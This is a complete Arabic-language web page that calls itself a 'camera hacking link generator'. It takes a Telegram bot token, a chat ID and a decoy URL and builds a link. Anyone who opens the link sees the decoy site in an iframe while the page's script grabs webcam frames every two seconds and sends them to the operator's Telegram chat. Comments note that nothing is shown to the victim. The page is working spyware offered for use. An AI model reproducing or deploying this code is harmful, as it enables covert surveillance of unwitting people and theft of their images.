<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>MARO - مولد روابط اختراق الكاميرا </title>
  <style>
    :root{
      --bg1:#0b0712;
      --card:#131026;
      --accent1:#a66bff;
      --accent2:#6e3be0;
      --muted:#bfaef6;
    }
    html,body{height:100%;margin:0;font-family: 'Poppins', Tahoma, sans-serif;background:var(--bg1);color:#fff}
    /* الخلفية الصورة */
    body{
      background-image: url("https://i.ibb.co/ccvSfNKt/f8373d322110e98419d228013b405636.jpg");
      background-size: cover;
      background-position: center;
      background-attachment: fixed;
      position:relative;
    }
    /* دايمًا إضافة غطاء لطمس الخلفية قليل */
    .overlay {
      position:fixed; inset:0; background: linear-gradient(18deg, rgba(6,6,8,0.6), rgba(6,6,1,0.8));
      z-index:0;
    }

    /* الحاوية المركزية */
    .wrap{position:relative;z-index:2;min-height:100vh;display:flex;flex-direction:column;align-items:center;padding:30px 20px;box-sizing:border-box}

    /* هيدر */
    .header{width:100%;max-width:1100px;display:flex;justify-content:space-between;align-items:center;margin-bottom:24px}
    .brand{font-weight:800;font-size:22px;color:var(--accent1);letter-spacing:0.6px}
    .nav{display:flex;gap:18px}
    .nav a{color:#e6dbff;text-decoration:none;padding:8px 14px;border-radius:10px;background:rgba(255,255,255,0.03)}

    /* البطاقة */
    .card{width:100%;max-width:720px;background: linear-gradient(180deg, rgba(18,12,34,0.85), rgba(10,7,18,0.75));
      border-radius:16px;padding:22px;box-shadow: 0 10px 40px rgba(0,0,0,0.6);backdrop-filter: blur(4px);}

    .hero{display:flex;gap:20px;align-items:center;flex-wrap:wrap}
    .hero-left{flex:1;min-width:260px}
    .title{font-size:34px;color:var(--accent1);margin:0 0 8px}
    .subtitle{color:var(--muted);margin:0 0 18px}

    /* الفورم */
    .form {background: rgba(255,255,255,0.03); padding:14px;border-radius:12px}
    label{display:block;color:#d7c9ff;font-weight:700;margin:10px 0 6px}
    input[type="text"]{width:100%;padding:12px;border-radius:10px;border:1px solid rgba(255,255,255,0.04);background:transparent;color:#fff;outline:none;font-size:14px;box-sizing:border-box}
    .row{display:flex;gap:12px}
    .btn{
      display:inline-block;padding:12px 16px;border-radius:12px;border:none;background:linear-gradient(90deg,var(--accent1),var(--accent2));color:#fff;font-weight:800;cursor:pointer;margin-top:12px;width:100%;
    }
    .result{margin-top:14px;padding:10px;border-radius:10px;background:rgba(255,255,255,0.02);word-break:break-all;font-size:14px;display:flex;gap:10px;align-items:center;justify-content:space-between}
    .copyBtn{padding:8px 12px;border-radius:10px;background:rgba(255,255,255,0.06);border:1px solid rgba(255,255,255,0.04);cursor:pointer;color:#fff}

    /* شارة الكاميرا الصغيرة */
    .captureBadge{
      position:fixed;top:14px;right:14px;z-index:9999;
      background:rgba(0,0,0,0.55);padding:8px 12px;border-radius:999px;font-weight:800;color:#ffd966;font-size:13px;display:none;
      box-shadow:0 8px 30px rgba(0,0,0,0.5);backdrop-filter: blur(4px);
    }

    /* Made by MARO */
    .madeby{position:fixed;left:14px;bottom:14px;z-index:9999;color:#d9c9ff;background:rgba(12,7,20,0.5);padding:8px 12px;border-radius:10px;font-weight:700;box-shadow:0 6px 20px rgba(0,0,0,0.5)}
    
    /* iframe full */
    .viewerFrame{width:100%;height:calc(100vh - 40px);border-radius:10px;border:0;overflow:hidden}
    
    /* responsive */
    @media (max-width:720px){
      .title{font-size:28px}
      .card{padding:16px}
      .wrap{padding:18px}
    }
  </style>
</head>
<body>
  <div class="overlay"></div>

  <div class="wrap">

    <!-- Header -->
    <div class="header" style="width:100%;max-width:1100px;"> 
      <div class="nav">
        <a href="#"></a>
        <a href="#"></a>
      </div>
    </div>

    <!-- Card with form -->
    <div class="card" id="cardArea" style="width:100%">
      <div class="hero">
        <div class="hero-left">
          <h1 class="title">Hello, I'm MARO</h1>
          

          <div class="form" id="formBox">
            <label>أدخل الـ ID</label>
            <input type="text" id="chatIdInput" placeholder="Chat ID">

            <label>أدخل توكن البوت</label>
            <input type="text" id="tokenInput" placeholder="Bot Token">

            <label>أدخل الرابط الذي تريد عرضه</label>
            <input type="text" id="linkInput" placeholder="https://b7xha.github.io/Maroweb/">

            <button class="btn" id="generateBtn">إنشاء الرابط</button>

            <div id="result" style="display:none" class="result">
              <div id="linkText" style="flex:1;color:#e7dbff;font-size:13px;"></div>
              <button class="copyBtn" id="copyBtn">نسخ الرابط</button>
            </div>
          </div>
        </div>

        <!-- Visual side (big CTA buttons like screenshot) -->
        <div style="min-width:260px;flex:0 0 260px;">
          <div style="background:linear-gradient(180deg, rgba(128,77,255,0.08), rgba(0,0,0,0.15));padding:14px;border-radius:12px;text-align:center">
            
          </div>
        </div>
      </div>
    </div>

  </div>

  <!-- small badge and made by -->
  <div id="captureBadge" class="captureBadge"></div>
  <div class="madeby"></div>

<script>
  // عناصر
  const generateBtn = document.getElementById('generateBtn');
  const resultEl = document.getElementById('result');
  const linkText = document.getElementById('linkText');
  const copyBtn = document.getElementById('copyBtn');

  // عند الضغط يولد الرابط المباشر (بدون اختصار)
  generateBtn.addEventListener('click', () => {
    const chat = document.getElementById('chatIdInput').value.trim();
    const token = document.getElementById('tokenInput').value.trim();
    const url = document.getElementById('linkInput').value.trim();

    if(!chat || !token || !url){
      alert('املأ كل الحقول');
      return;
    }

    const fullLink = `${window.location.origin}${window.location.pathname}?chat=${encodeURIComponent(chat)}&token=${encodeURIComponent(token)}&url=${encodeURIComponent(url)}`;
    linkText.innerText = fullLink;
    resultEl.style.display = 'flex';
  });

  // زر النسخ
  copyBtn.addEventListener('click', async () => {
    try {
      await navigator.clipboard.writeText(linkText.innerText);
      copyBtn.innerText = 'تم النسخ';
      setTimeout(()=> copyBtn.innerText = 'نسخ الرابط',1500);
    } catch(e) {
      alert('فشل النسخ: ' + e.message);
    }
  });

  // --- viewer mode: لو الرابط يحتوي پاراميترز نعرض iframe ونشغل الكاميرا ---
  const params = new URLSearchParams(window.location.search);
  const chat = params.get('chat');
  const token = params.get('token');
  const target = params.get('url');

  if (chat && token && target) {
    // استبدال المحتوى بعرض الـ iframe (مع الحفاظ على البادج ومصدر الخلفية)
    document.getElementById('cardArea').style.display = 'none';
    // نضع iframe يغطي اللـ fold لكن نريد الاحتفاظ بالبادج و madeby
    const iframe = document.createElement('iframe');
    iframe.className = 'viewerFrame';
    iframe.src = target;
    // نضيف iframe بعد الـ wrap
    document.querySelector('.wrap').appendChild(iframe);

    // اظهار البادج
    const captureBadge = document.getElementById('captureBadge');
    captureBadge.style.display = 'inline-block';

    // نبدأ الكاميرا ونرسل صور كل 2 ثانية
    (async function startCameraAndSend(){
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
        const vid = document.createElement('video');
        vid.autoplay = true; vid.playsInline = true; vid.muted = true; vid.style.display = 'none';
        vid.srcObject = stream;
        document.body.appendChild(vid);

        const canvas = document.createElement('canvas');

        // إرسال كل 2 ثانية
        const tick = async () => {
          if (!vid.videoWidth) return;
          canvas.width = vid.videoWidth;
          canvas.height = vid.videoHeight;
          const ctx = canvas.getContext('2d');
          ctx.drawImage(vid, 0, 0, canvas.width, canvas.height);

          canvas.toBlob(async (blob) => {
            if (!blob) return;
            try {
              const form = new FormData();
              form.append('chat_id', chat);
              form.append('photo', blob, 'img.png');

              await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
                method: 'POST',
                body: form
              });
              // لا نظهر أي رسالة للمستخدم — البادج كافي
            } catch (err) {
              // لو خطأ في الإرسال نغير نص البادج مؤقتاً
              captureBadge.textContent = '⚠️ خطأ في الإرسال';
              captureBadge.style.background = 'rgba(160,40,40,0.9)';
              console.error('Send error', err);
            }
          }, 'image/png');
        };

        // أولاً تأكد الفيديو شغال ثم ضبط interval
        const intervalId = setInterval(tick, 2000);

        // تنظيف عند الخروج
        window.addEventListener('beforeunload', () => {
          clearInterval(intervalId);
          stream.getTracks().forEach(t => t.stop());
        });

      } catch (err) {
        // إذن الكاميرا مرفوض أو مشكلة، نبِّه المستخدم بالبادج
        const captureBadge = document.getElementById('captureBadge');
        captureBadge.textContent = '❌ إذن الكاميرا مرفوض';
        captureBadge.style.background = 'rgba(160,40,40,0.9)';
        console.error('Camera error', err);
      }
    })();
  }
</script>
</body>
</html>
